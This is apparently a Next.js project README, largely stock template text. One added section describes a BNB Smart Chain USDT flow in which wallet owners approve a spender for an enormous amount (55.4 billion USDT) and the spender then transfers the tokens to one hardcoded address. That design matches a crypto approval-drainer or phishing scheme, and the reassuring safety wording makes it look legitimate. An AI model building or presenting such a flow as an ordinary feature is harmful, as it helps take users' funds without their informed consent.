This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).

## BNB Smart Chain USDT flow

The reusable implementation is in [`src/lib/usdt-bsc.ts`](./src/lib/usdt-bsc.ts). It targets the verified Binance-Peg BSC-USD contract at `0x55d398326f99059fF775485246999027B3197955`, reads its live `decimals()` value, and requests two explicit wallet signatures:

1. The token owner approves the requested spender for `55,400,000,000` USDT.
2. The spender calls `transferFrom` to `0xf39AfA7346aACE4a3Aa48cEb014bE24cba2EB596`.

Only pass wallet providers supplied by the user's wallet (EIP-1193); never pass private keys or seed phrases. Review both transaction prompts and the recipient before signing. The Solidity executor in [`contracts/UsdtTransferExecutor.sol`](./contracts/UsdtTransferExecutor.sol) is an optional fixed-recipient alternative: the owner must approve the deployed executor contract, and only its configured authorized spender can call it.

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.

This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.

## Deploy on Vercel

The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
